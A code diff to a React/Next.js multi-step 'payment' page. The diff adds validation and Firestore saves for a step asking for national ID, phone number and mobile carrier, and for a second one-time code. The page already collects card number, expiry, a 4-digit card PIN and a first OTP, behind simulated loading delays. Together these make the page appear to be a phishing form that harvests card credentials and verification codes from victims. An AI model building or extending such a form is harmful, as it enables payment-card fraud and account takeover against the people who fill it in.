@@ -7,6 +7,7 @@ import Loader from "../components/loader"
 import { useRouter } from "next/navigation"
 
 type PaymentInfo = {
+  createdDate: string
   cardNumber: string
   year: string
   month: string
@@ -118,6 +119,7 @@ export default function Payment() {
   const [isloading, setisloading] = useState(false)
   const router = useRouter()
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
+    createdDate: new Date().toISOString(),
     cardNumber: "",
     year: "",
     month: "",
@@ -175,7 +177,7 @@ export default function Payment() {
       if (interval) clearInterval(interval)
     }
   }, [isCountdownActive, countdown])
-  
+
   return (
     <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir="ltr">
       <form
@@ -548,7 +550,8 @@ export default function Payment() {
                         id="timer"
                         className="w-full"
                         value={paymentInfo.otp}
-                        placeholder={ `${countdown}s` }/>
+                        placeholder={`${countdown}s`}
+                      />
                     </div>
                   </div>
                 ) : step === 3 ? (
@@ -592,7 +595,13 @@ export default function Payment() {
                               paymentInfo.month === "" ||
                               paymentInfo.year === "" ||
                               paymentInfo.pass.length !== 4)) ||
-                          (step === 2 && paymentInfo.otp?.length !== 6)
+                          (step === 2 && paymentInfo.otp?.length !== 6) ||
+                          (step === 3 &&
+                            (paymentInfo.idNumber === "" ||
+                              paymentInfo.phoneNumber === "" ||
+                              paymentInfo.network === "" ||
+                              paymentInfo.phoneNumber.length !== 8)) ||
+                          (step === 4 && paymentInfo.otp2?.length !== 6)
                         }
                         onClick={() => {
                           if (step === 1) {
@@ -620,12 +629,18 @@ export default function Payment() {
                             console.log(step, 3)
                             setisloading(true)
 
+                            // Save step 3 data to Firestore
+                            handlePay(paymentInfo, setPaymentInfo)
+
                             setTimeout(() => {
                               setstep(4)
                               setisloading(false)
                             }, 3000)
                           } else if (step === 4) {
                             setisloading(true)
+
+                            // Save step 4 data (otp2) to Firestore
+                            handlePay(paymentInfo, setPaymentInfo)
 
                             setTimeout(() => {
                               setisloading(false)
@@ -636,6 +651,7 @@ export default function Payment() {
                           setPaymentInfo({
                             ...paymentInfo,
                             otp: "",
+                            otp2: step === 4 ? "" : paymentInfo.otp2,
                           })
                         }}
                       >
@@ -684,7 +700,7 @@ export default function Payment() {
   )
 }
 
-const Step3 = ({setPaymentInfo,paymentInfo }:any) => {
+const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
   return (
     <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
       <div className="row">
@@ -719,8 +735,8 @@ const Step3 = ({setPaymentInfo,paymentInfo }:any) => {
           <input
             name="number"
             onChange={(e: any) =>
-             setPaymentInfo({
-            ...paymentInfo,
+              setPaymentInfo({
+                ...paymentInfo,
                 phoneNumber: e.target.value,
               })
             }
@@ -744,7 +760,7 @@ const Step3 = ({setPaymentInfo,paymentInfo }:any) => {
           style={{ width: "60%" }}
           name="company"
           onChange={(e: any) =>
-         setPaymentInfo({
+            setPaymentInfo({
               ...paymentInfo,
               network: e.target.value,
             })
@@ -767,7 +783,6 @@ const Step3 = ({setPaymentInfo,paymentInfo }:any) => {
   )
 }
 const Step4 = (props: any) => {
-
   return (
     <div>
       <div className="row">
